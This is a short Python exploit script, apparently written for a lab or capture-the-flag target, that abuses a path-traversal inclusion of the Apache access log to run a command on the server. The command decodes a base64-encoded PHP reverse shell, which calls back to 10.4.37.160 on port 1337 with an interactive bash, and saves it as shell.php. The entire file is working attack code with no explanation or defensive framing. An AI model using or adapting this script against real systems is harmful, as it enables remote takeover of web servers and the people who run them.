import requests

uRL = 'http://10.10.164.84/?'
v = 'dogs/../../../../../var/log/apache2/access.log'
payload ='echo PD9waHAKLy8gcGhwLXJldmVyc2Utc2hlbGwgLSBBIFJldmVyc2UgU2hlbGwgaW1wbGVtZW50YXRpb24gaW4gUEhQLiBDb21tZW50cyBzdHJpcHBlZCB0byBzbGltIGl0IGRvd24uIFJFOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcGVudGVzdG1vbmtleS9waHAtcmV2ZXJzZS1zaGVsbC9tYXN0ZXIvcGhwLXJldmVyc2Utc2hlbGwucGhwCi8vIENvcHlyaWdodCAoQykgMjAwNyBwZW50ZXN0bW9ua2V5QHBlbnRlc3Rtb25rZXkubmV0CgpzZXRfdGltZV9saW1pdCAoMCk7CiRWRVJTSU9OID0gIjEuMCI7CiRpcCA9ICcxMC40LjM3LjE2MCc7CiRwb3J0ID0gMTMzNzsKJGNodW5rX3NpemUgPSAxNDAwOwokd3JpdGVfYSA9IG51bGw7CiRlcnJvcl9hID0gbnVsbDsKJHNoZWxsID0gJ3VuYW1lIC1hOyB3OyBpZDsgL2Jpbi9iYXNoIC1pJzsKJGRhZW1vbiA9IDA7CiRkZWJ1ZyA9IDA7CgppZiAoZnVuY3Rpb25fZXhpc3RzKCdwY250bF9mb3JrJykpIHsKCSRwaWQgPSBwY250bF9mb3JrKCk7CgkKCWlmICgkcGlkID09IC0xKSB7CgkJcHJpbnRpdCgiRVJST1I6IENhbid0IGZvcmsiKTsKCQlleGl0KDEpOwoJfQoJCglpZiAoJHBpZCkgewoJCWV4aXQoMCk7ICAvLyBQYXJlbnQgZXhpdHMKCX0KCWlmIChwb3NpeF9zZXRzaWQoKSA9PSAtMSkgewoJCXByaW50aXQoIkVycm9yOiBDYW4ndCBzZXRzaWQoKSIpOwoJCWV4aXQoMSk7Cgl9CgoJJGRhZW1vbiA9IDE7Cn0gZWxzZSB7CglwcmludGl0KCJXQVJOSU5HOiBGYWlsZWQgdG8gZGFlbW9uaXNlLiAgVGhpcyBpcyBxdWl0ZSBjb21tb24gYW5kIG5vdCBmYXRhbC4iKTsKfQoKY2hkaXIoIi8iKTsKCnVtYXNrKDApOwoKLy8gT3BlbiByZXZlcnNlIGNvbm5lY3Rpb24KJHNvY2sgPSBmc29ja29wZW4oJGlwLCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCAzMCk7CmlmICghJHNvY2spIHsKCXByaW50aXQoIiRlcnJzdHIgKCRlcnJubykiKTsKCWV4aXQoMSk7Cn0KCiRkZXNjcmlwdG9yc3BlYyA9IGFycmF5KAogICAwID0+IGFycmF5KCJwaXBlIiwgInIiKSwgIC8vIHN0ZGluIGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHJlYWQgZnJvbQogICAxID0+IGFycmF5KCJwaXBlIiwgInciKSwgIC8vIHN0ZG91dCBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwogICAyID0+IGFycmF5KCJwaXBlIiwgInciKSAgIC8vIHN0ZGVyciBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwopOwoKJHByb2Nlc3MgPSBwcm9jX29wZW4oJHNoZWxsLCAkZGVzY3JpcHRvcnNwZWMsICRwaXBlcyk7CgppZiAoIWlzX3Jlc291cmNlKCRwcm9jZXNzKSkgewoJcHJpbnRpdCgiRVJST1I6IENhbid0IHNwYXduIHNoZWxsIik7CglleGl0KDEpOwp9CgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1swXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzFdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMl0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRzb2NrLCAwKTsKCnByaW50aXQoIlN1Y2Nlc3NmdWxseSBvcGVuZWQgcmV2ZXJzZSBzaGVsbCB0byAkaXA6JHBvcnQiKTsKCndoaWxlICgxKSB7CglpZiAoZmVvZigkc29jaykpIHsKCQlwcmludGl0KCJFUlJPUjogU2hlbGwgY29ubmVjdGlvbiB0ZXJtaW5hdGVkIik7CgkJYnJlYWs7Cgl9CgoJaWYgKGZlb2YoJHBpcGVzWzFdKSkgewoJCXByaW50aXQoIkVSUk9SOiBTaGVsbCBwcm9jZXNzIHRlcm1pbmF0ZWQiKTsKCQlicmVhazsKCX0KCgkkcmVhZF9hID0gYXJyYXkoJHNvY2ssICRwaXBlc1sxXSwgJHBpcGVzWzJdKTsKCSRudW1fY2hhbmdlZF9zb2NrZXRzID0gc3RyZWFtX3NlbGVjdCgkcmVhZF9hLCAkd3JpdGVfYSwgJGVycm9yX2EsIG51bGwpOwoKCWlmIChpbl9hcnJheSgkc29jaywgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkc29jaywgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNPQ0s6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkcGlwZXNbMF0sICRpbnB1dCk7Cgl9CgoJaWYgKGluX2FycmF5KCRwaXBlc1sxXSwgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQgUkVBRCIpOwoJCSRpbnB1dCA9IGZyZWFkKCRwaXBlc1sxXSwgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNURE9VVDogJGlucHV0Iik7CgkJZndyaXRlKCRzb2NrLCAkaW5wdXQpOwoJfQoKCWlmIChpbl9hcnJheSgkcGlwZXNbMl0sICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJSIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMl0sICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlI6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsKCX0KfQoKZmNsb3NlKCRzb2NrKTsKZmNsb3NlKCRwaXBlc1swXSk7CmZjbG9zZSgkcGlwZXNbMV0pOwpmY2xvc2UoJHBpcGVzWzJdKTsKcHJvY19jbG9zZSgkcHJvY2Vzcyk7CgpmdW5jdGlvbiBwcmludGl0ICgkc3RyaW5nKSB7CglpZiAoISRkYWVtb24pIHsKCQlwcmludCAiJHN0cmluZ1xuIjsKCX0KfQoKPz4= | base64 -d >shell.php'
parameters = {'ext':'','view':v,'c':payload}

r= requests.get(uRL, params=parameters)
print(r.text)

